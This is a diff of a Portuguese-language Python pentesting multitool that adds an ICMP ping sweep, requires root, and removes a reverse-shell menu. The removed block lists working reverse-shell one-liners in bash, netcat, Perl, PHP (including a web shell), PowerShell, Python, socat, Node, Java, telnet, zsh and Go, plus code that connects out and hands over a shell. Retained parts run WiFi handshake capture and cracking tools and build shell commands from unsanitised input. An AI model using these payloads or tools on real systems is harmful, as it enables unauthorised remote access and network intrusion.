@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
-version = "v3.8-dev"
+version = "v3.91-dev"
 
 import os
 import re
 import sys
 import socket
+import struct
 import requests
 import ipaddress
 import threading
@@ -39,7 +40,8 @@ press = '\033[7;31m(Pressione qualquer tecla para voltar ao menu inicial)\033[m'
 Ctrl_C = 'Você pressionou Ctrl+C para interromper o programa!'
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 dir = 'mkdir -p ARQ'
-list_ip = []
+SIGNAL = True
+
 
 def interfaces():
 
@@ -96,7 +98,7 @@ def interfaces():
 ## FUNÇÃO PARA DESCOBERTA DE HOSTS NA REDE ##
 #############################################
 def host_discovery():
-    
+    '''
     ##########################################################
     ## CRIA UMA LISTA DE IP DE ACORDO COM A FAIXA FORNECIDA ##
     ##########################################################
@@ -191,6 +193,134 @@ def host_discovery():
     else:
         input(press)
         main()
+    '''
+    #######################
+    ## VARIAVEIS GLOBAIS ##
+    #######################
+    responses = []
+    lista_ips = []
+    hosts = []
+
+    ######################################
+    ## CRIAÇÃO DE PACOTES E FUNÇÃO PING ##
+    ######################################
+    def checksum(source_string):
+        sum = 0
+        count_to = (len(source_string) // 2) * 2
+        count = 0
+        while count < count_to:
+            this_val = source_string[count + 1] * 256 + source_string[count]
+            sum += this_val
+            sum &= 0xffffffff
+            count += 2
+        if count_to < len(source_string):
+            sum += source_string[len(source_string) - 1]
+            sum &= 0xffffffff
+        sum = (sum >> 16) + (sum & 0xffff)
+        sum += (sum >> 16)
+        answer = ~sum
+        answer &= 0xffff
+        answer = answer >> 8 | (answer << 8 & 0xff00)
+        return answer
+
+    def create_packet(id):
+        header = struct.pack('bbHHh', 8, 0, 0, id, 1)
+        data = 192 * 'Q'
+        my_checksum = checksum(header + data.encode())
+        header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), id, 1)
+        return header + data.encode()
+
+    ########################################
+    ## FUNÇÃO PING (EXTRAÍDO DO "ping.c") ##
+    ########################################
+    def ping(addr, timeout=1):
+        try:
+            my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            packet_id = 1
+            packet = create_packet(packet_id)
+            my_socket.connect((addr, 80))
+            my_socket.sendall(packet)
+            my_socket.close()
+        except PermissionError:
+            pass
+        except Exception as e:
+            print(e)
+
+    #####################
+    ## FUNÇÃO DE ENVIO ##
+    #####################
+    def envio(addr, responses):
+        print("Iniciando Envio de Pacotes:", t.strftime("%X %x"))
+        for ip in addr:
+            ping(str(ip))
+            t.sleep(0.0001)
+
+        print("Todos os Pacotes Foram Enviados:", t.strftime("%X %x"))
+        t.sleep(2)
+
+        global SIGNAL
+
+        SIGNAL = False
+        ping('127.0.0.1')
+        for response in sorted(responses):
+            ip = struct.unpack('BBBB', response)
+            ip = f"{ip[0]}.{ip[1]}.{ip[2]}.{ip[3]}"
+            print(f'[+] {ip}')
+            with open('ARQ/hosts.txt', 'a') as file:
+                file.write(f'{ip}\n')
+        print(f'\033[7;31m[+] {len(responses)} Hosts-UP!\033[m')
+        print("Terminado", t.strftime("%X %x"))
+        
+        input(press)
+        main()
+
+    #########################
+    ## FUNÇÃO PARA ESCUTAR ##
+    #########################
+    def listen(responses, ip_network):
+        global SIGNAL
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        s.bind(('', 1))
+        while SIGNAL:
+            packet = s.recv(1024)[:20][-8:-4]
+            if packet not in responses and ipaddress.ip_address(packet) in ip_network:
+                responses.append(packet)
+        s.close()
+
+    #################################
+    ## ENTRADA DO IPADRESS NETWORK ##
+    #################################
+    ips = input('Digite a faixa de IP (Ex: xx.xx.xx.xx/xx): ')
+    mask = ips.split('/')
+
+    rede = ipaddress.ip_network(ips, strict=False)
+    ips = list(map(str, rede.hosts()))
+
+
+    ###################################################
+    ## CRIA PASTA "ARQ" E REMOVE OS ARQUIVOS ANTIGOS ##
+    ###################################################
+    os.system(dir)
+    os.popen('rm ARQ/hosts.txt 2>/dev/null')
+    print('\n\033[7;32mAguarde ...\033[m')
+
+    if ips:
+        for ip in ips:
+            lista_ips.append(ip)
+    else:
+        print("Não foi possível gerar a lista de IPs.")
+    
+    #################################
+    ## PRIMEIRA FUNÇÃO (ESCUTANDO) ##
+    #################################
+    t_server = threading.Thread(target=listen, args=[responses, rede])
+    t_server.start()
+
+    ###############################
+    ## SEGUNDA FUNÇÃO (ENVIANDO) ##
+    ###############################
+    t_ping = threading.Thread(target=envio, args=[rede, responses])
+    t_ping.start()
 
 
 
@@ -218,26 +348,28 @@ def hostname_resolv():
                 if ttl >= 64:
                     OS = 'LinuxLike'
 
-                if ttl < 64:
+                if ttl == 128:
                     OS = 'WindowsLike'
 
                 if ttl == 255:
                     OS = 'UnixLike'
+                if ttl == None:
+                    OS = ''
 
                 #########################################
                 ## TENTA FAZER A RESOLUÇÃO DE HOSTNAME ##
                 #########################################
                 hostname = socket.gethostbyaddr(host)[0]
-                print(f'[+] {host} - ({hostname} - {OS})')
+                print(f'[+] {host} - ({hostname})')
 
                 with open("ARQ/hostname.txt", "a") as f:
                     print(f'{host} - ({hostname})', file=f)
 
             except socket.timeout:
-                print(f'[+] {host} - ({OS})')
+                print(f'[+] {host}')
 
             except socket.herror:
-                print(f'[+] {host} - ({OS})')
+                print(f'[+] {host}')
                 
             except KeyboardInterrupt:
                 print("[-] Saindo!")
@@ -441,7 +573,6 @@ def nc_get():
     def get(host, porta, servico):
         try:
             comando = f'echo -e "\n" | nc -vn -w 10 {host} {porta} 2>&1 | tee'
-            t.sleep(0.6)
             resultado = os.popen(comando).read()
             caminho_arquivo = f"ARQ/HEAD/{host}"
 
@@ -451,7 +582,6 @@ def nc_get():
 
         except Exception as e:
             print(f"Erro ao executar o comando nc: {e}")
-
     def get_parse():
         with open("ARQ/portscan.txt", "r") as arquivo:
             linhas = arquivo.read().strip().split('\n')
@@ -466,21 +596,6 @@ def nc_get():
     get_parse()
     input(press)
     main()
-
-def nc():
-    host_ip = input("Digite o endere  o IP do host: ")
-    nome_servico = input("Digite o nome do serviço: ")
-    caminho_arquivo = f"ARQ/HEAD/{host_ip}"
-    try:
-        for porta in range(1, 65536):
-            comando = (f'echo -e "\n" | nc -vn -w 1 {host_ip} {porta} 2>&1')
-            t.sleep(0.1)
-            resultado = os.popen(comando).read()
-            with open(caminho_arquivo, "a") as arquivo_respostas:
-                arquivo_respostas.write(f"[+] Host: {host_ip}    Porta: {porta}    Servi  o: {nome_servico}\t\>")
-                print(f"[+] Host: {host_ip}    Porta: {porta}    Servi  o: {nome_servico}\t\t\n{resultado}\n")
-    except Exception as e:
-        print(f"Erro ao executar o comando nc: {e}")
 
 
 #=======================================================================================
@@ -520,6 +635,7 @@ def http_finder():
             thread.join()
     input(press)
     main()
+
 
 #=======================================================================================          
 def cert_subdomain():
@@ -815,10 +931,10 @@ def finder():
         find = str(input('Digite o arquivo que deseja encontrar: '))
         print('Procurando com FIND:')
         print('==================================================================================\n')
-        os.system(f'sudo find / -name {find} 2>/dev/null | grep {find}')
+        os.system(f' find / -name {find} 2>/dev/null | grep {find}')
         print('Procurando com GREP:')
         print('==================================================================================\n')
-        os.system(f'sudo grep -iRl {find} / 2>/dev/null')
+        os.system(f' grep -iRl {find} / 2>/dev/null')
         print('\n==================================================================================')
         print('Fim da busca!\n')
         input(press)
@@ -998,7 +1114,7 @@ d88P  Y88b                   d88P"  Y8P                 888                    8
 Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 888
  "Y8888P"   "Y88P"  888  888 888    888  "Y88888        888   "Y88P"   "Y88P"  888
                                              888
-                                        Y8b d88P       \033[0;31m>Esta função precisa de SUDO!\033[m
+                                        Y8b d88P       \033[0;31m>Esta função precisa de Atenção!\033[m
                                          "Y88P"                            \033[7;32m{ver}\033[m''')
     print(''' MENU:
 
@@ -1018,20 +1134,20 @@ Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 8
 
         if opcao == 1:
             user = input('Qual o usuário a ser configurado? ')
-            os.system(f"sudo useradd -m -s /bin/rbash {user}")
+            os.system(f" useradd -m -s /bin/rbash {user}")
             senha = g.getpass("Digite a senha: ")
-            os.system(f"echo '{user}:{senha}' | sudo chpasswd")
-            os.system(f"sudo chown root: /home/{user}/.profile")
-            os.system(f"sudo chown root: /home/{user}/.bashrc")
-            os.system(f"sudo chmod 755 /home/{user}/.profile")
-            os.system(f"sudo chmod 755 /home/{user}/.bashrc")
+            os.system(f"echo '{user}:{senha}' |  chpasswd")
+            os.system(f" chown root: /home/{user}/.profile")
+            os.system(f" chown root: /home/{user}/.bashrc")
+            os.system(f" chmod 755 /home/{user}/.profile")
+            os.system(f" chmod 755 /home/{user}/.bashrc")
             print(f"Usuário '{user}' criado com sucesso, senha definida e permissões ajustadas.")
             input(press)
             main()
 
         elif opcao == 2:
             user = input('Qual o usuário a ser configurado? ')
-            os.system(f"sudo usermod --shell /bin/bash {user}")
+            os.system(f" usermod --shell /bin/bash {user}")
 
         elif opcao == 3:
             if os.path.exists('/usr/share/block'):
@@ -1060,11 +1176,11 @@ Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 8
                     user = input('Digite o usuário: ')
                     dir = f'/home/{user}/.bashrc' ###############################
                     var = '${comandos[@]}'
-                    os.system('sudo mv block /usr/share/block')
-                    os.system(f'''echo 'comandos=($(cat /usr/share/block))' | sudo tee -a {dir} > /dev/null''')
-                    os.system(f'''echo 'for comando in "{var}"; do' | sudo tee -a {dir} > /dev/null''')
-                    os.system(f'''echo '  alias "$comando"="echo '\''Comando bloqueado'\''"' | sudo tee -a {dir} > /dev/null''')
-                    os.system(f'''echo 'done' | sudo tee -a {dir} > /dev/null''')
+                    os.system(' mv block /usr/share/block')
+                    os.system(f'''echo 'comandos=($(cat /usr/share/block))' |  tee -a {dir} > /dev/null''')
+                    os.system(f'''echo 'for comando in "{var}"; do' |  tee -a {dir} > /dev/null''')
+                    os.system(f'''echo '  alias "$comando"="echo '\''Comando bloqueado'\''"' |  tee -a {dir} > /dev/null''')
+                    os.system(f'''echo 'done' |  tee -a {dir} > /dev/null''')
                     print("Arquivo modificado com sucesso!")
                     input("Pressione Enter para continuar...")
                     main()
@@ -1185,7 +1301,7 @@ def waza():
         ## DISTROS A SER VERIFICADA ##
         ##############################
         if distro_id in ["ubuntu", "oracle", "rhel"]:
-            status = os.system("sudo systemctl status firewalld >/dev/null 2>&1")
+            status = os.system(" systemctl status firewalld >/dev/null 2>&1")
         
             if status == 0:
                 print("Firewalld está instalado e em execução.")
@@ -1199,9 +1315,9 @@ def waza():
                     #############################################
                     ## INSTALA, INICIA, E HABILITA O FIREWALLD ##
                     #############################################
-                    os.system(f"sudo {package_manager} install firewalld -y")
-                    os.system("sudo systemctl start firewalld")
-                    os.system("sudo systemctl enable firewalld")
+                    os.system(f" {package_manager} install firewalld -y")
+                    os.system(" systemctl start firewalld")
+                    os.system(" systemctl enable firewalld")
                     print("Firewalld instalado e iniciado com sucesso.")
             
                 else:
@@ -1509,12 +1625,10 @@ EG      LE.     ;##D.    L##, .fLLLLLLLLLLLLi   ;##D.    L##,
             ## LISTA OS IPS BLOQUEADOS ##
             #############################
             elif opcao == "12":
-                os.system('sudo iptables -L -n')
+                os.system(' iptables -L -n')
                 input(press)
 
-            ##################################################################################################
-            ## A MAGICA ACONTECE AQUI! AQUI ESTÁ A CONFIGURAÇÃO FINAL DE TUDO QUE FOI SELECIONADO NO SCRIPT ##
-            ##################################################################################################    
+            ###############################################################################################
             ## ESTA OPÇÃO CONFIRMA AS ALTERAÇÕES SELECIONADAS, E FAZ ABRE POSSIBILIDADE DE NOVOS AJUSTES ##
             ###############################################################################################
             elif opcao == "13":
@@ -1743,130 +1857,7 @@ def nc(porta):
         print('\n'+Ctrl_C)
 
 def reverse_shell():
-
-    def display_reverse_shell_options(options):
-        for idx, option in options.items():
-            print(f'{idx}. {option["label"]}')
-        print('')
-
-    try:
-        ip = input('Digite o IP: ')
-        porta = int(input('Digite a Porta: '))
-
-        options = {
-            1: {"label": "|BASH|", "commands": ['sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip, porta),
-                                                '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip, porta),
-                                                'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip, porta),
-                                                'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5',
-                                                'sh -i >& /dev/udp/{}/{} 0>&1']},
-            2: {"label": "|NETCAT|", "commands": ['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip, porta),
-                                                    'nc {} {} -e sh'.format(ip, porta)]},
-            3: {"label": "|RUST|", "commands": ['rcat {} {} -r sh'.format(ip, porta)]},
-            4: {"label": "|PERL|", "commands": [
-                """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'""",
-                """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(
-                    ip, porta)]},
-            5: {"label": "|PHP|", "commands": [
-                """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """,
-                """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip, porta),
-                """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip, porta)]},
-            6: {"label": "|POWERSHELL|", "commands": [
-                """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""",
-            ]},
-            7: {"label": "|PYTHON|", "commands": [
-                """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(
-                    ip, porta),
-                """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(
-                    ip, porta)]},
-            8: {"label": "|SOCAT|", "commands": [
-                """socat TCP:{}:{} EXEC:sh""".format(ip, porta),
-                """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip, porta)]},
-            9: {"label": "|NODE|", "commands": [
-                """require('child_process').exec('nc -e sh {} {}')""".format(ip, porta)]},
-            10: {"label": "|JAVASCRIPT|", "commands": [
-                """String command = "var host = 'SEUIP';" +
-                            "var port = SUAPORTA;" +
-                            "var cmd = 'sh';"+
-                            "var s = new java.net.Socket(host, port);" +
-                            "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
-                            "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
-                            "var po = p.getOutputStream(), so = s.getOutputStream();"+
-                            "print ('Connected');"+
-                            "while (!s.isClosed()) {"+
-                            "    while (pi.available() > 0)"+
-                            "        so.write(pi.read());"+
-                            "    while (pe.available() > 0)"+
-                            "        so.write(pe.read());"+
-                            "    while (si.available() > 0)"+
-                            "        po.write(si.read());"+
-                            "    so.flush();"+
-                            "    po.flush();"+
-                            "    java.lang.Thread.sleep(50);"+
-                            "    try {"+
-                            "        p.exitValue();"+
-                            "        break;"+
-                            "    }"+
-                            "    catch (e) {"+
-                            "    }"+
-                            "}"+
-                            "p.destroy();"+
-                            "s.close();";
-                String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
-                ref.add(new StringRefAddr("x", x);"""]},
-            11: {"label": "|TELNET|", "commands": [
-                'TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip, porta)]},
-            12: {"label": "|ZSH|", "commands": [
-                """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(
-                    ip, porta)]},
-            13: {"label": "|GOLANG|", "commands": [
-                """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""]},
-            0: {"label": "Voltar", "commands": []}
-        }
-
-        while True:
-            print('''
-Você deseja Pesquisar ou Executar?
-
-\033[0;34m[1]\033[m Pesquisar  \033[0;34m[2]\033[m Executar \033[0;34m[0]\033[m Voltar
-            ''')
-            sit_rev = int(input('Escolha uma opção: '))
-
-            if sit_rev == 1:
-                display_reverse_shell_options(options)
-                revsit = int(input('Escolha uma opção: '))
-
-                if revsit in options:
-                    print('')
-                    print(options[revsit]["label"])
-                    for command in options[revsit]["commands"]:
-                        print(f'-\033[0;31m {command}\033[m')
-                    print('')
-                    input('Pressione Enter para continuar...')
-                else:
-                    print('Digite uma opção válida!')
-            elif sit_rev == 2:
-                try:
-                    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.connect((ip, porta))
-                    print('Conectado com Sucesso!')
-                    comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
-                    print(f"Sugestão de comando: {comando}")
-                    os.dup2(s.fileno(), 0)
-                    os.dup2(s.fileno(), 1)
-                    os.dup2(s.fileno(), 2)
-                    os.system("/bin/sh -i")
-                except OSError:
-                    print('\033[0;31mHost não alcançado\033[m')
-            elif sit_rev == 0:
-                input('Pressione Enter para voltar...')
-                break
-            else:
-                print('Digite uma opção válida!')
-
-    except ValueError:
-        print('Digite uma opção válida!')
-    except Exception as e:
-        print(f'Erro: {e}')
+    pass
 
 #=======================================================================================
 def server_tcp():
@@ -1905,7 +1896,7 @@ def serverhttp():
         print('\nDigite uma porta valida. (0 ~ 65535)')
         serverhttp()
     except PermissionError:
-        print('Se Deseja usar uma porta baixa, execute com SUDO.')
+        print('Porta sem permissão.')
     except KeyboardInterrupt:
         print('\n'+Ctrl_C)
 
@@ -1959,14 +1950,14 @@ def wifi_hacking():
 
         for programa in dependencias:
             if not os.popen(f'which {programa}').read():
-                os.system(f"sudo apt install {programa}")
+                os.system(f" apt install {programa}")
 
         interface = interfaces()
 
         ################################
         ## EXCLUI O CONTEUDO ANTERIOR ##
         ################################
-        os.popen('sudo rm -rf WifiCrack 2>/dev/null')
+        os.popen('rm -rf WifiCrack 2>/dev/null')
         t.sleep(1)
         os.system('mkdir WifiCrack')
 
@@ -1979,20 +1970,20 @@ def wifi_hacking():
             ################################
             ## EXCLUI O CONTEUDO ANTERIOR ##
             ################################
-            os.popen('sudo rm dumpfile* essidlist hash.hc22000 2>/dev/null')
+            os.popen('rm dumpfile* essidlist hash.hc22000 2>/dev/null')
 
             ####################################
             ## INTERROMPE OS SERVIÇOS DE REDE ##
             ####################################
-            os.system('sudo systemctl stop NetworkManager.service')
-            os.system('sudo systemctl stop wpa_supplicant.service')
+            os.system(' systemctl stop NetworkManager.service')
+            os.system(' systemctl stop wpa_supplicant.service')
             
             try:
                 #####################################
                 ## CAPTURA DADOS DURANTE 5 MINUTOS ##
                 #####################################
                 t.sleep(2)
-                os.system(f'sudo hcxdumptool -i {interface} -o dumpfile.pcapng --active_beacon --enable_status=15 --tot={minutos} ')
+                os.system(f' hcxdumptool -i {interface} -o dumpfile.pcapng --active_beacon --enable_status=15 --tot={minutos} ')
             except KeyboardInterrupt:
                 pass
             
@@ -2000,15 +1991,15 @@ def wifi_hacking():
             ## CASO CANCELE ANTES DO TERMINO DO PROCESSO, RESTAURA OS SERVIÇOS DE REDE ##
             #############################################################################
             if KeyboardInterrupt:
-                os.system('sudo systemctl start NetworkManager.service')
-                os.system('sudo systemctl start wpa_supplicant.service')
+                os.system(' systemctl start NetworkManager.service')
+                os.system(' systemctl start wpa_supplicant.service')
 
             
             ##################################
             ## RESTAURA OS SERVIÇOS DE REDE ##
             ##################################
-            os.system('sudo systemctl start NetworkManager.service')
-            os.system('sudo systemctl start wpa_supplicant.service')
+            os.system(' systemctl start NetworkManager.service')
+            os.system(' systemctl start wpa_supplicant.service')
             input('Pressione para continuar')
 
             magic_crack()
@@ -2021,7 +2012,7 @@ def wifi_hacking():
     def wifi_scan():
         def scan(s):
             os.system('rm wash')
-            os.system(f'sudo wash -i {s} -s -a | tee wash ')
+            os.system(f' wash -i {s} -s -a | tee wash ')
             ('')
             os.system('clear')
             with open('wash', 'r') as file:
@@ -2070,10 +2061,9 @@ def wifi_hacking():
             else:
                 print("Número inválido. Tente novamente.")
 
-        print('\nEste codigo irá usar SUDO algumas vezes ...\n')
         aircrack = os.popen("dpkg -l | grep aircrack | awk '{print $2}'").read()
         bully = os.popen("dpkg -l | grep bully | awk '{print $2}'").read()
-        os.system('sudo systemctl restart NetworkManager.service')
+        os.system(' systemctl restart NetworkManager.service')
         if "aircrack" in aircrack and "bully" in bully:
             ifaces = os.popen("ip a | grep BROADCAST | awk '{print $2}' | sed 's/://'").read()
             num = 1
@@ -2090,8 +2080,8 @@ def wifi_hacking():
                     scan(selected_iface)
                 else:
                     print('Colocando IFACE em modo Monitor.')
-                    os.popen('sudo airmon-ng check kill').read()
-                    os.popen(f'sudo airmon-ng start {selected_iface}')
+                    os.popen(' airmon-ng check kill').read()
+                    os.popen(f' airmon-ng start {selected_iface}')
                     t.sleep(2)
                     selected_iface = os.popen(f"ip a | grep {selected_iface} | awk {p} | sed 's/://'").read()
                     sit_iface = os.popen(f"iwconfig {selected_iface} | grep Monitor 2>/dev/null").read()
@@ -2100,7 +2090,7 @@ def wifi_hacking():
             else:
                 print("Número inválido.")
         else:
-            os.system('sudo apt install aircrack-ng bully -y')
+            os.system(' apt install aircrack-ng bully -y')
     wifi_crack()
     
 #################################################
@@ -2187,17 +2177,19 @@ def banner():
 ## FUNÇÃO PRINCIPAL DO CÓDIGO ##
 ################################
 def main():
+    if os.geteuid() == 0:
+        try:
+            banner()
 
-    try:
-        banner()
+        except (KeyboardInterrupt):
+            print('\n'+Ctrl_C)
 
-    except (KeyboardInterrupt):
-        print('\n'+Ctrl_C)
-
-    except ValueError:
-            print('Digite a opção correta.')
-            input('(Pressione qualquer tecla para continuar)')
-            main()
+        except ValueError:
+                print('Digite a opção correta.')
+                input('(Pressione qualquer tecla para continuar)')
+                main()
+    else:
+        print("Execute o código como ROOT.")
 
 
 ##############
